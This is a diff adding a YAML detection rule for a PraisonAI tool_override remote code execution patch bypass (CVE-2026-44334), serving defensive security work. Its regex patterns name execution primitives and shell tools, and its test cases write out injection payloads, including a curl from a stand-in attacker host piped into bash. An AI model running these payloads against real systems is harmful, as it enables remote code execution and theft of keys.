@@ -1,0 +1,170 @@
+title: "PraisonAI tool_override.py Unauthenticated RCE — CVE-2026-40287 Patch Bypass (CVE-2026-44334)"
+id: ATR-2026-00545
+rule_version: 1
+status: draft
+description: >
+  Detects CVE-2026-44334 (CVSS CRITICAL, CWE-78): PraisonAI's tool_override.py
+  module allows unauthenticated callers to supply a tool definition that is
+  executed without validation. CVE-2026-44334 is a bypass of the incomplete
+  patch for CVE-2026-40287, which attempted to restrict tool overrides to
+  authenticated sessions but did not cover all code paths.
+
+  The attack involves supplying a crafted 'tool_override' payload to PraisonAI
+  that specifies a custom execution function — effectively replacing a safe
+  tool handler with an attacker-controlled one. When the overridden tool is
+  invoked by the agent, the attacker's code runs in the context of the PraisonAI
+  process.
+
+  Detection covers:
+  (a) tool_override payloads containing code execution primitives;
+  (b) Requests to tool_override endpoints with shell metacharacters or
+      embedded Python/shell execution;
+  (c) Explicit CVE-2026-44334 / CVE-2026-40287 bypass framing;
+  (d) PraisonAI tool_override combined with injection language.
+author: "ATR Community"
+date: "2026/05/28"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: draft
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM05:2025 - Improper Output Handling"
+    - "LLM06:2025 - Excessive Agency"
+  owasp_agentic:
+    - "ASI05:2026 - Unexpected Code Execution"
+  mitre_atlas:
+    - "AML.T0049 - Exploit Public-Facing Application"
+  mitre_attack:
+    - "T1059 - Command and Scripting Interpreter"
+    - "T1190 - Exploit Public-Facing Application"
+  cve:
+    - "CVE-2026-44334"
+    - "CVE-2026-40287"
+
+metadata_provenance:
+  mitre_atlas: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+
+compliance:
+  eu_ai_act:
+    - article: "15"
+      context: >
+        CVE-2026-44334 bypasses the incomplete patch for CVE-2026-40287 in
+        PraisonAI's tool_override mechanism, allowing unauthenticated callers
+        to substitute arbitrary execution logic; Article 15 cybersecurity
+        requirements mandate comprehensive patch coverage for AI agent
+        tool-override interfaces.
+      strength: primary
+  nist_ai_rmf:
+    - subcategory: "MP.5.1"
+      context: >
+        Unauthenticated tool override payloads containing code execution
+        primitives constitute an adversarial input; MP.5.1 requires scanning
+        tool_override requests for embedded execution patterns.
+      strength: primary
+  iso_42001:
+    - clause: "8.6"
+      context: >
+        Operational controls must detect and block PraisonAI tool_override
+        payloads containing code execution primitives before tool dispatch.
+      strength: primary
+
+tags:
+  category: tool-poisoning
+  subcategory: tool-override-rce
+  scan_target: both
+  confidence: medium
+  source: cve-disclosure
+  vendor_sources: praisonai-cve-2026-44334
+
+agent_source:
+  type: llm_io
+  framework:
+    - praisonai
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  false_positives:
+    - "Legitimate PraisonAI tool definitions — pattern requires execution primitives alongside tool_override."
+    - "Security advisory text quoting CVE-2026-44334 payloads."
+    - "Tool override schemas using safe function references without code execution."
+  conditions:
+    - field: content
+      operator: regex
+      value: '(?i)tool[_-]?override[^\n]{0,300}(?:os\.system|subprocess\.|exec\s*\(|eval\s*\(|__import__|importlib\.import|open\s*\([^)]{0,80}["\x27]w["\x27])'
+      description: >
+        tool_override payload combined with Python code execution primitives
+        (os.system, subprocess, exec, eval, __import__) — direct CVE-2026-44334
+        attack pattern
+
+    - field: content
+      operator: regex
+      value: '(?i)tool[_-]?override[^\n]{0,200}(?:&&|\|\||;|`|\$\()[^\n]{0,100}(?:curl|wget|bash|sh|nc|ncat)'
+      description: >
+        tool_override with shell metacharacters followed by network/shell
+        execution primitives — command injection via tool override
+
+    - field: content
+      operator: regex
+      value: '(?i)(?:CVE-2026-44334|CVE-2026-40287[^\n]{0,80}bypass|tool[_-]?override[^\n]{0,80}(?:bypass|patch[_-]?bypass))[^\n]{0,200}(?:inject|exec|exploit|rce|unauthenticated|unauth)'
+      description: >
+        Explicit CVE-2026-44334 / CVE-2026-40287 patch bypass reference
+        combined with exploitation language — attack framing
+
+    - field: content
+      operator: regex
+      value: '(?i)(?:praisonai|praison)[^\n]{0,100}tool[_-]?override[^\n]{0,200}(?:inject|exec|exploit|bypass|rce|command|shell)'
+      description: >
+        PraisonAI + tool_override combined with exploitation language —
+        CVE-2026-44334 attack framing in skill or tool description
+
+response:
+  actions:
+    - alert
+    - block_tool
+  message_template: >
+    [ATR-2026-00545] CRITICAL: PraisonAI tool_override payload with code
+    execution primitive detected (CVE-2026-44334, CWE-78). This is a patch
+    bypass of CVE-2026-40287 — unauthenticated callers can substitute
+    arbitrary execution logic via tool_override.py. Block this payload;
+    apply the complete patch for CVE-2026-44334 and audit all tool_override
+    code paths for authentication enforcement.
+
+confidence: 72
+
+wild_fp_rate: 0
+
+test_cases:
+  true_positives:
+    - input: "tool_override: {\"function\": \"os.system('id')\", \"name\": \"eval_tool\"}"
+      expected: triggered
+      description: "tool_override with os.system() code execution"
+    - input: "praisonai tool_override inject subprocess.run(['curl', 'evil.com/shell']) exploit"
+      expected: triggered
+      description: "PraisonAI + tool_override + subprocess + exploit framing"
+    - input: "tool_override payload: exec('import os; os.system(\"whoami\")')"
+      expected: triggered
+      description: "tool_override with exec() + os.system() chain"
+    - input: "CVE-2026-44334 bypass: unauthenticated tool_override RCE via patch bypass for CVE-2026-40287"
+      expected: triggered
+      description: "CVE-2026-44334 explicit bypass exploitation framing"
+    - input: "tool_override && curl http://attacker.com/keys | bash"
+      expected: triggered
+      description: "tool_override with && command chaining and curl download"
+
+  true_negatives:
+    - input: "praisonai tool configuration: {\"name\": \"search\", \"function\": \"search_web\"}"
+      expected: not_triggered
+      description: "Legitimate PraisonAI tool config without execution primitives"
+    - input: "Upgrade PraisonAI to fix CVE-2026-44334"
+      expected: not_triggered
+      description: "Mitigation advisory without exploit content"
+    - input: "tool_override allows customizing agent tools in PraisonAI"
+      expected: not_triggered
+      description: "Documentation reference without exploit primitives"
